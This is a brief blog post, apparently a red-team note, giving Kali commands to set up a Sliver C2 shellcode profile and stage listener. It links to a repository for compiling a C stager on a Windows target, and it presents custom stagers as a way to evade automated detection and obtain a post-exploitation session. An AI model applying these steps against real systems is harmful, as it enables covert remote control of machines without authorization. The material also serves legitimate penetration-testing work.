---
title: "custom sliver stager"
date: "2023-01-08"
layout: post
---

First all props go to Dominic doing all the hard work and if you want to know the nitty gritty plus different ways of getting custom stagers up and running go check out his write up.

[https://dominicbreuker.com/post/learning\_sliver\_c2\_06\_stagers/](https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)


My experience is that custom stagers can help evade automated detection mechanisms but realizing it's always a cat and mouse game these are just the steps that have worked for me as of this write up.

Sliver instructions within Kali

```bash
apt-get install sliver
sliver-server
profiles new --http IP:80 --format shellcode name
stage-listener --url http://IP:80 --profile name
```

Above the IP is the C2 server / Kali IP address and the 'name' refers to the unique name you assign it on the command line. Once that's done then head over to your windows target and compile the stager following the simple instructions below.

[https://github.com/travisaltman/sliver-c-stager/blob/main/README.md](https://github.com/travisaltman/sliver-c-stager/blob/main/README.md)

After executing the compiled exe you should hopefully have a session within Sliver to continue your post exploitation goodness.
